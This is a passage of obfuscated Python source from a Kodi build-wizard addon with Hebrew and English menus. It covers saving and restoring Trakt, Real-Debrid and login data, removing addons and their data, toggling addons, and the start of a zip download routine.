	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O00O0OO0O0O0OOO00 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3160
	addFile ('%s שמירת פליליסט לאודר:  '%O0O0OO00OO00OOOOO .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת הגדרות באפר: '%O0O0OOO0OO000O000 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3166
	addFile ('%s שמירת רשימות ריפו:  '%O000000O00OOO0OOO .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3168
	setView ('files','viewType')#line:3170
def traktMenu ():#line:3172
	O00OO00OO0OO0000O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3173
	O00OO000OO00O0OO0 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3174
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3175
	addFile ('Save Trakt Data: %s'%O00OO00OO0OO0000O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3176
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O00OO000OO00O0OO0 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3177
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3178
	for O00OO00OO0OO0000O in traktit .ORDER :#line:3180
		O00O0O0O0O00000O0 =TRAKTID [O00OO00OO0OO0000O ]['name']#line:3181
		O0O000O000OOO0OO0 =TRAKTID [O00OO00OO0OO0000O ]['path']#line:3182
		OO0OO00O00O000000 =TRAKTID [O00OO00OO0OO0000O ]['saved']#line:3183
		OO00O0OOOO00O0OO0 =TRAKTID [O00OO00OO0OO0000O ]['file']#line:3184
		O0O0O0OOO0O0OOO0O =wiz .getS (OO0OO00O00O000000 )#line:3185
		O00O000000OO0O00O =traktit .traktUser (O00OO00OO0OO0000O )#line:3186
		OO0OOOOO00000OO0O =TRAKTID [O00OO00OO0OO0000O ]['icon']if os .path .exists (O0O000O000OOO0OO0 )else ICONTRAKT #line:3187
		O0000OOOOO0OO00OO =TRAKTID [O00OO00OO0OO0000O ]['fanart']if os .path .exists (O0O000O000OOO0OO0 )else FANART #line:3188
		O0OO0O00O0OOOO0O0 =createMenu ('saveaddon','Trakt',O00OO00OO0OO0000O )#line:3189
		O0O0O000OOO0OOOOO =createMenu ('save','Trakt',O00OO00OO0OO0000O )#line:3190
		O0OO0O00O0OOOO0O0 .append ((THEME2 %'%s Settings'%O00O0O0O0O00000O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O00OO00OO0OO0000O )))#line:3191
		addFile ('[+]-> %s'%O00O0O0O0O00000O0 ,'',icon =OO0OOOOO00000OO0O ,fanart =O0000OOOOO0OO00OO ,themeit =THEME3 )#line:3193
		if not os .path .exists (O0O000O000OOO0OO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0OOOOO00000OO0O ,fanart =O0000OOOOO0OO00OO ,menu =O0OO0O00O0OOOO0O0 )#line:3194
		elif not O00O000000OO0O00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O00OO00OO0OO0000O ,icon =OO0OOOOO00000OO0O ,fanart =O0000OOOOO0OO00OO ,menu =O0OO0O00O0OOOO0O0 )#line:3195
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O000000OO0O00O ,'authtrakt',O00OO00OO0OO0000O ,icon =OO0OOOOO00000OO0O ,fanart =O0000OOOOO0OO00OO ,menu =O0OO0O00O0OOOO0O0 )#line:3196
		if O0O0O0OOO0O0OOO0O =="":#line:3197
			if os .path .exists (OO00O0OOOO00O0OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O00OO00OO0OO0000O ,icon =OO0OOOOO00000OO0O ,fanart =O0000OOOOO0OO00OO ,menu =O0O0O000OOO0OOOOO )#line:3198
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O00OO00OO0OO0000O ,icon =OO0OOOOO00000OO0O ,fanart =O0000OOOOO0OO00OO ,menu =O0O0O000OOO0OOOOO )#line:3199
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O0OOO0O0OOO0O ,'',icon =OO0OOOOO00000OO0O ,fanart =O0000OOOOO0OO00OO ,menu =O0O0O000OOO0OOOOO )#line:3200
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3202
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3203
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3204
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3205
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3206
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3207
	setView ('files','viewType')#line:3208
def realMenu ():#line:3210
	O0O00OO0OO00OOOO0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3211
	OOOOO0OO00O00O00O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3212
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3213
	addFile ('Save Real Debrid Data: %s'%O0O00OO0OO00OOOO0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3214
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOOOO0OO00O00O00O ),'',icon =ICONREAL ,themeit =THEME3 )#line:3215
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3216
	for O0O00OO0000O0O000 in debridit .ORDER :#line:3218
		O000OOO0O000O00O0 =DEBRIDID [O0O00OO0000O0O000 ]['name']#line:3219
		OOO00O00O000OO000 =DEBRIDID [O0O00OO0000O0O000 ]['path']#line:3220
		OOOOOO0O00O00O00O =DEBRIDID [O0O00OO0000O0O000 ]['saved']#line:3221
		O0OOOOO0OOOO000O0 =DEBRIDID [O0O00OO0000O0O000 ]['file']#line:3222
		O0OOOO0000OO00O00 =wiz .getS (OOOOOO0O00O00O00O )#line:3223
		OOO0O00OO0O0O000O =debridit .debridUser (O0O00OO0000O0O000 )#line:3224
		O0OOOOO0OOO0OO00O =DEBRIDID [O0O00OO0000O0O000 ]['icon']if os .path .exists (OOO00O00O000OO000 )else ICONREAL #line:3225
		OO00OOOO0OOO0OOOO =DEBRIDID [O0O00OO0000O0O000 ]['fanart']if os .path .exists (OOO00O00O000OO000 )else FANART #line:3226
		OOO0OO0O000O0O0O0 =createMenu ('saveaddon','Debrid',O0O00OO0000O0O000 )#line:3227
		OO00O0OOO00000000 =createMenu ('save','Debrid',O0O00OO0000O0O000 )#line:3228
		OOO0OO0O000O0O0O0 .append ((THEME2 %'%s Settings'%O000OOO0O000O00O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0O00OO0000O0O000 )))#line:3229
		addFile ('[+]-> %s'%O000OOO0O000O00O0 ,'',icon =O0OOOOO0OOO0OO00O ,fanart =OO00OOOO0OOO0OOOO ,themeit =THEME3 )#line:3231
		if not os .path .exists (OOO00O00O000OO000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOOOO0OOO0OO00O ,fanart =OO00OOOO0OOO0OOOO ,menu =OOO0OO0O000O0O0O0 )#line:3232
		elif not OOO0O00OO0O0O000O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0O00OO0000O0O000 ,icon =O0OOOOO0OOO0OO00O ,fanart =OO00OOOO0OOO0OOOO ,menu =OOO0OO0O000O0O0O0 )#line:3233
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0O00OO0O0O000O ,'authdebrid',O0O00OO0000O0O000 ,icon =O0OOOOO0OOO0OO00O ,fanart =OO00OOOO0OOO0OOOO ,menu =OOO0OO0O000O0O0O0 )#line:3234
		if O0OOOO0000OO00O00 =="":#line:3235
			if os .path .exists (O0OOOOO0OOOO000O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0O00OO0000O0O000 ,icon =O0OOOOO0OOO0OO00O ,fanart =OO00OOOO0OOO0OOOO ,menu =OO00O0OOO00000000 )#line:3236
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0O00OO0000O0O000 ,icon =O0OOOOO0OOO0OO00O ,fanart =OO00OOOO0OOO0OOOO ,menu =OO00O0OOO00000000 )#line:3237
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOOO0000OO00O00 ,'',icon =O0OOOOO0OOO0OO00O ,fanart =OO00OOOO0OOO0OOOO ,menu =OO00O0OOO00000000 )#line:3238
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3240
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3241
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3242
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3243
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3244
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3245
	setView ('files','viewType')#line:3246
def loginMenu ():#line:3248
	O0OOOOOO0O00O0OOO ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3249
	OOOO00OO00O0O000O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3250
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3251
	addFile ('Save Login Data: %s'%O0OOOOOO0O00O0OOO ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3252
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOOO00OO00O0O000O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3253
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3254
	for O0OOOOOO0O00O0OOO in loginit .ORDER :#line:3256
		O0OOOOO0OOOOO0O00 =LOGINID [O0OOOOOO0O00O0OOO ]['name']#line:3257
		O000OOOOOOO00OOOO =LOGINID [O0OOOOOO0O00O0OOO ]['path']#line:3258
		OOOOOO000O0OOO0O0 =LOGINID [O0OOOOOO0O00O0OOO ]['saved']#line:3259
		O0O000O00O0O0OO0O =LOGINID [O0OOOOOO0O00O0OOO ]['file']#line:3260
		OOO00OO00O0000O0O =wiz .getS (OOOOOO000O0OOO0O0 )#line:3261
		O0OO0O0O00OO0O000 =loginit .loginUser (O0OOOOOO0O00O0OOO )#line:3262
		OOOOO0O0OOOOOOO00 =LOGINID [O0OOOOOO0O00O0OOO ]['icon']if os .path .exists (O000OOOOOOO00OOOO )else ICONLOGIN #line:3263
		OO000OO0000O00OO0 =LOGINID [O0OOOOOO0O00O0OOO ]['fanart']if os .path .exists (O000OOOOOOO00OOOO )else FANART #line:3264
		O0O00O000OO0OO00O =createMenu ('saveaddon','Login',O0OOOOOO0O00O0OOO )#line:3265
		O000OO0OO0O0OOO0O =createMenu ('save','Login',O0OOOOOO0O00O0OOO )#line:3266
		O0O00O000OO0OO00O .append ((THEME2 %'%s Settings'%O0OOOOO0OOOOO0O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0OOOOOO0O00O0OOO )))#line:3267
		addFile ('[+]-> %s'%O0OOOOO0OOOOO0O00 ,'',icon =OOOOO0O0OOOOOOO00 ,fanart =OO000OO0000O00OO0 ,themeit =THEME3 )#line:3269
		if not os .path .exists (O000OOOOOOO00OOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOO0O0OOOOOOO00 ,fanart =OO000OO0000O00OO0 ,menu =O0O00O000OO0OO00O )#line:3270
		elif not O0OO0O0O00OO0O000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0OOOOOO0O00O0OOO ,icon =OOOOO0O0OOOOOOO00 ,fanart =OO000OO0000O00OO0 ,menu =O0O00O000OO0OO00O )#line:3271
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OO0O0O00OO0O000 ,'authlogin',O0OOOOOO0O00O0OOO ,icon =OOOOO0O0OOOOOOO00 ,fanart =OO000OO0000O00OO0 ,menu =O0O00O000OO0OO00O )#line:3272
		if OOO00OO00O0000O0O =="":#line:3273
			if os .path .exists (O0O000O00O0O0OO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0OOOOOO0O00O0OOO ,icon =OOOOO0O0OOOOOOO00 ,fanart =OO000OO0000O00OO0 ,menu =O000OO0OO0O0OOO0O )#line:3274
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0OOOOOO0O00O0OOO ,icon =OOOOO0O0OOOOOOO00 ,fanart =OO000OO0000O00OO0 ,menu =O000OO0OO0O0OOO0O )#line:3275
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO00OO00O0000O0O ,'',icon =OOOOO0O0OOOOOOO00 ,fanart =OO000OO0000O00OO0 ,menu =O000OO0OO0O0OOO0O )#line:3276
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3278
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3279
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3280
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3281
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3282
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3283
	setView ('files','viewType')#line:3284
def fixUpdate ():#line:3286
	if KODIV <17 :#line:3287
		OOOOO000O0OOO0O0O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3288
		try :#line:3289
			os .remove (OOOOO000O0OOO0O0O )#line:3290
		except Exception as O0OOOO00OO0OOOO00 :#line:3291
			wiz .log ("Unable to remove %s, Purging DB"%OOOOO000O0OOO0O0O )#line:3292
			wiz .purgeDb (OOOOO000O0OOO0O0O )#line:3293
	else :#line:3294
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3295
def removeAddonMenu ():#line:3297
	O0O00OOOO00OOOO00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3298
	O0O00O0O000OO0000 =[];O0000OOO0OOOO0OOO =[]#line:3299
	for OOOOO000OOOO00O0O in sorted (O0O00OOOO00OOOO00 ,key =lambda OOOOOO0O00O00OOOO :OOOOOO0O00O00OOOO ):#line:3300
		O00O0000OOOOO00OO =os .path .split (OOOOO000OOOO00O0O [:-1 ])[1 ]#line:3301
		if O00O0000OOOOO00OO in EXCLUDES :continue #line:3302
		elif O00O0000OOOOO00OO in DEFAULTPLUGINS :continue #line:3303
		elif O00O0000OOOOO00OO =='packages':continue #line:3304
		OO00O0OOO000O00O0 =os .path .join (OOOOO000OOOO00O0O ,'addon.xml')#line:3305
		if os .path .exists (OO00O0OOO000O00O0 ):#line:3306
			OO0O0O00OOOOOOO0O =open (OO00O0OOO000O00O0 )#line:3307
			OOO0OOOOO00000OO0 =OO0O0O00OOOOOOO0O .read ()#line:3308
			O000OO00O0OOOOO0O =wiz .parseDOM (OOO0OOOOO00000OO0 ,'addon',ret ='id')#line:3309
			O00OOOOOO0O000O0O =O00O0000OOOOO00OO if len (O000OO00O0OOOOO0O )==0 else O000OO00O0OOOOO0O [0 ]#line:3311
			try :#line:3312
				OOO0OO00000OO00O0 =xbmcaddon .Addon (id =O00OOOOOO0O000O0O )#line:3313
				O0O00O0O000OO0000 .append (OOO0OO00000OO00O0 .getAddonInfo ('name'))#line:3314
				O0000OOO0OOOO0OOO .append (O00OOOOOO0O000O0O )#line:3315
			except :#line:3316
				pass #line:3317
	if len (O0O00O0O000OO0000 )==0 :#line:3318
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3319
		return #line:3320
	if KODIV >16 :#line:3321
		O00OO00OOO00O00O0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0O00O0O000OO0000 )#line:3322
	else :#line:3323
		O00OO00OOO00O00O0 =[];OOOO0OOOO000000O0 =0 #line:3324
		O00O00O0OOOOO00O0 =["-- Click here to Continue --"]+O0O00O0O000OO0000 #line:3325
		while not OOOO0OOOO000000O0 ==-1 :#line:3326
			OOOO0OOOO000000O0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00O00O0OOOOO00O0 )#line:3327
			if OOOO0OOOO000000O0 ==-1 :break #line:3328
			elif OOOO0OOOO000000O0 ==0 :break #line:3329
			else :#line:3330
				O000O000000O00OO0 =(OOOO0OOOO000000O0 -1 )#line:3331
				if O000O000000O00OO0 in O00OO00OOO00O00O0 :#line:3332
					O00OO00OOO00O00O0 .remove (O000O000000O00OO0 )#line:3333
					O00O00O0OOOOO00O0 [OOOO0OOOO000000O0 ]=O0O00O0O000OO0000 [O000O000000O00OO0 ]#line:3334
				else :#line:3335
					O00OO00OOO00O00O0 .append (O000O000000O00OO0 )#line:3336
					O00O00O0OOOOO00O0 [OOOO0OOOO000000O0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0O00O0O000OO0000 [O000O000000O00OO0 ])#line:3337
	if O00OO00OOO00O00O0 ==None :return #line:3338
	if len (O00OO00OOO00O00O0 )>0 :#line:3339
		wiz .addonUpdates ('set')#line:3340
		for OO0OO0OOOOO0O00O0 in O00OO00OOO00O00O0 :#line:3341
			removeAddon (O0000OOO0OOOO0OOO [OO0OO0OOOOO0O00O0 ],O0O00O0O000OO0000 [OO0OO0OOOOO0O00O0 ],True )#line:3342
		xbmc .sleep (1000 )#line:3344
		if INSTALLMETHOD ==1 :OOO0OO0O0OOOO0OOO =1 #line:3346
		elif INSTALLMETHOD ==2 :OOO0OO0O0OOOO0OOO =0 #line:3347
		else :OOO0OO0O0OOOO0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3348
		if OOO0OO0O0OOOO0OOO ==1 :wiz .reloadFix ('remove addon')#line:3349
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3350
def removeAddonDataMenu ():#line:3352
	if os .path .exists (ADDOND ):#line:3353
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3354
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3355
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3356
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3357
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3358
		OO00O000O000OOO0O =glob .glob (os .path .join (ADDOND ,'*/'))#line:3359
		for O0O00O0O0O0O0O0OO in sorted (OO00O000O000OOO0O ,key =lambda O0OOOOO00OO0O0O0O :O0OOOOO00OO0O0O0O ):#line:3360
			O0OOOOOOOO0O00000 =O0O00O0O0O0O0O0OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3361
			OO000OO0O000OO000 =os .path .join (O0O00O0O0O0O0O0OO .replace (ADDOND ,ADDONS ),'icon.png')#line:3362
			O00OO00O0O0OOOO00 =os .path .join (O0O00O0O0O0O0O0OO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3363
			OO000O0O000OOO000 =O0OOOOOOOO0O00000 #line:3364
			O0OO0OO00O0000000 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3365
			for O0O0OO000O00OOO00 in O0OO0OO00O0000000 :#line:3366
				OO000O0O000OOO000 =OO000O0O000OOO000 .replace (O0O0OO000O00OOO00 ,O0OO0OO00O0000000 [O0O0OO000O00OOO00 ])#line:3367
			if O0OOOOOOOO0O00000 in EXCLUDES :OO000O0O000OOO000 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO000O0O000OOO000 #line:3368
			else :OO000O0O000OOO000 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO000O0O000OOO000 #line:3369
			addFile (' %s'%OO000O0O000OOO000 ,'removedata',O0OOOOOOOO0O00000 ,icon =OO000OO0O000OO000 ,fanart =O00OO00O0O0OOOO00 ,themeit =THEME2 )#line:3370
	else :#line:3371
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3372
	setView ('files','viewType')#line:3373
def enableAddons ():#line:3375
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3376
	O0OOO000OO0OO0O00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3377
	OO00OO0O00OO00O00 =0 #line:3378
	for O0O0O0OOO0O0OOOO0 in sorted (O0OOO000OO0OO0O00 ,key =lambda OO0O00OO000O0000O :OO0O00OO000O0000O ):#line:3379
		OO0OOOO0O00OOO0OO =os .path .split (O0O0O0OOO0O0OOOO0 [:-1 ])[1 ]#line:3380
		if OO0OOOO0O00OOO0OO in EXCLUDES :continue #line:3381
		if OO0OOOO0O00OOO0OO in DEFAULTPLUGINS :continue #line:3382
		O00O0000OO00OOOO0 =os .path .join (O0O0O0OOO0O0OOOO0 ,'addon.xml')#line:3383
		if os .path .exists (O00O0000OO00OOOO0 ):#line:3384
			OO00OO0O00OO00O00 +=1 #line:3385
			O0OOO000OO0OO0O00 =O0O0O0OOO0O0OOOO0 .replace (ADDONS ,'')[1 :-1 ]#line:3386
			O00OOO0OO000OOOOO =open (O00O0000OO00OOOO0 )#line:3387
			OO0OO0O0000O0000O =O00OOO0OO000OOOOO .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3388
			O00O000O0OO0OOOOO =wiz .parseDOM (OO0OO0O0000O0000O ,'addon',ret ='id')#line:3389
			OO000O0OO000O000O =wiz .parseDOM (OO0OO0O0000O0000O ,'addon',ret ='name')#line:3390
			try :#line:3391
				OO00O00OOO0O0OO0O =O00O000O0OO0OOOOO [0 ]#line:3392
				OO0O0OO00OO00O000 =OO000O0OO000O000O [0 ]#line:3393
			except :#line:3394
				continue #line:3395
			try :#line:3396
				O00O00000O00OOOOO =xbmcaddon .Addon (id =OO00O00OOO0O0OO0O )#line:3397
				OOO0000O0OOOO0O0O ="[COLOR green][Enabled][/COLOR]"#line:3398
				OO00OO0OOO00O0OOO ="false"#line:3399
			except :#line:3400
				OOO0000O0OOOO0O0O ="[COLOR red][Disabled][/COLOR]"#line:3401
				OO00OO0OOO00O0OOO ="true"#line:3402
				pass #line:3403
			O00OO000OO0OO000O =os .path .join (O0O0O0OOO0O0OOOO0 ,'icon.png')if os .path .exists (os .path .join (O0O0O0OOO0O0OOOO0 ,'icon.png'))else ICON #line:3404
			O0O00OOOOO0OO00O0 =os .path .join (O0O0O0OOO0O0OOOO0 ,'fanart.jpg')if os .path .exists (os .path .join (O0O0O0OOO0O0OOOO0 ,'fanart.jpg'))else FANART #line:3405
			addFile ("%s %s"%(OOO0000O0OOOO0O0O ,OO0O0OO00OO00O000 ),'toggleaddon',O0OOO000OO0OO0O00 ,OO00OO0OOO00O0OOO ,icon =O00OO000OO0OO000O ,fanart =O0O00OOOOO0OO00O0 )#line:3406
			O00OOO0OO000OOOOO .close ()#line:3407
	if OO00OO0O00OO00O00 ==0 :#line:3408
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3409
	setView ('files','viewType')#line:3410
def changeFeq ():#line:3412
	OOO00OOO0O0000000 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3413
	OO000O0OOO0O0O00O =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOO00OOO0O0000000 )#line:3414
	if not OO000O0OOO0O0O00O ==-1 :#line:3415
		wiz .setS ('autocleanfeq',str (OO000O0OOO0O0O00O ))#line:3416
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOO00OOO0O0000000 [OO000O0OOO0O0O00O ]))#line:3417
def developer ():#line:3419
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3420
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3421
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3422
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3423
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3424
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3425
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3426
	setView ('files','viewType')#line:3428
def download (O0O00O0O000O0OO0O ,O00O0OOOOOOOOOOOO ):#line:3433
  O0O000O000000OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3434
  O000OOOO00O0O000O =xbmcgui .DialogProgress ()#line:3435
  O000OOOO00O0O000O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3436
  OO000O0O00OO00O00 =os .path .join (O0O000O000000OOO0 ,'isr.zip')#line:3437
  O0O0O0OOOOO00O00O =urllib2 .Request (O0O00O0O000O0OO0O )#line:3438
  OO00OOOOOO000OOO0 =urllib2 .urlopen (O0O0O0OOOOO00O00O )#line:3439
  OOO00OOO000O0OOOO =xbmcgui .DialogProgress ()#line:3441
  OOO00OOO000O0OOOO .create ("Downloading","Downloading "+name )#line:3442
  OOO00OOO000O0OOOO .update (0 )#line:3443
  OOO0O00O0O00O0O0O =O00O0OOOOOOOOOOOO #line:3444
  O000OO0OOO00OOO0O =open (OO000O0O00OO00O00 ,'wb')#line:3445
  try :#line:3447
    O000O0OOO0O00O0OO =OO00OOOOOO000OOO0 .info ().getheader ('Content-Length').strip ()#line:3448
    O0000O000OOO000OO =True #line:3449
  except AttributeError :#line:3450
        O0000O000OOO000OO =False #line:3451
  if O0000O000OOO000OO :#line:3453
        O000O0OOO0O00O0OO =int (O000O0OOO0O00O0OO )#line:3454
  O00O000OO0O00O0O0 =0 #line:3456
  O00O00O0000000OOO =time .time ()#line:3457
  while True :#line:3458
        O0O0OO00OO0O0OO0O =OO00OOOOOO000OOO0 .read (8192 )#line:3459
        if not O0O0OO00OO0O0OO0O :#line:3460
            sys .stdout .write ('\n')#line:3461
            break #line:3462
        O00O000OO0O00O0O0 +=len (O0O0OO00OO0O0OO0O )#line:3464
        O000OO0OOO00OOO0O .write (O0O0OO00OO0O0OO0O )#line:3465
        if not O0000O000OOO000OO :#line:3467
            O000O0OOO0O00O0OO =O00O000OO0O00O0O0 #line:3468
        if OOO00OOO000O0OOOO .iscanceled ():#line:3469
           OOO00OOO000O0OOOO .close ()#line:3470
           try :#line:3471
            os .remove (OO000O0O00OO00O00 )#line:3472
           except :#line:3473
            pass #line:3474
           break #line:3475
        O0OO0O00OOOO00OO0 =float (O00O000OO0O00O0O0 )/O000O0OOO0O00O0OO #line:3476
        O0OO0O00OOOO00OO0 =round (O0OO0O00OOOO00OO0 *100 ,2 )#line:3477
        OO00OOO0OO0OO00O0 =O00O000OO0O00O0O0 /(1024 *1024 )#line:3478
        OO0O000O00OO00000 =O000O0OOO0O00O0OO /(1024 *1024 )#line:3479
